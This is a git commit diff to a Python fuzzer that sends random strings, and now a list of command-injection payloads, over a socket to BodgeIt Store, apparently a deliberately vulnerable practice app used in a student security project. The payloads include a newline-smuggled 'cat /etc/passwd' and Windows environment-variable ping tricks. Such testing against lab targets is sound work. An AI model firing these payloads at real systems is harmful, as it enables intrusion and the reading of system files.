4fe7393c9b085bb52070db591dfb756b2bab4163
Thomas <taw7879@rit.edu>
2022-06-01 13:32:35 -0400

    started on commands

--- fuzzer.py
+++ fuzzer.py
@@ -29,19 +29,32 @@ while True:
             j = random.randint(32, 126)
             bad += chr(j)
 
-        print("\nSending random string of length " + str(length) + " to BodgeitStore...")
+        print("\nSending random string of length " + str(length) + " to BodgeIt Store...")
         client_socket.send(bad.encode())
         print("\nMessage successfully sent..\n")
-        time.sleep(2)
+        time.sleep(1)
 
+        try:
+            msg = client_socket.recv(1024)
+            print("Server:\n" + msg.decode())
+            print("\nString sent: " + bad)
+        except:
+            print("Server sent no response")
+
+    elif option == 2:
+        commands = ["something%0Acat%20/etc/passwd", "ping%PROGRAMFILES:~10,-5%IP", "ping%CommonProgramFiles:~10,-18%IP", "%%2727", "%25%27", "`+HERP", "'+'herp", "' 'DERP", "'%20'HERP", "'%2B'HERP"]
+        index = random.randint(0, len(commands)-1)
+        command = commands[index]
+        print("\nSending \"" + command + "\"" + " to BodgeIt Store...")
+        client_socket.send(command.encode())
+        print("\nCommand successfully sent..\n")
+        time.sleep(1)
+        
         try:
             msg = client_socket.recv(1024)
             print("Server:\n" + msg.decode())
         except:
             print("Server sent no response")
-
-    elif option == 2:
-        commands = ["UPDATE"]
     
     else:
         continue
@@ -51,6 +64,7 @@ while True:
         break
     else:
         os.system("cls")
+
 #except:
     #os.system("cls")
     #print("Failed to connect or Connection stopped to BodgeIt Store...")
@@ -58,4 +72,4 @@ while True:
     #os.system("cls")
 
 
-
+client_socket.close()
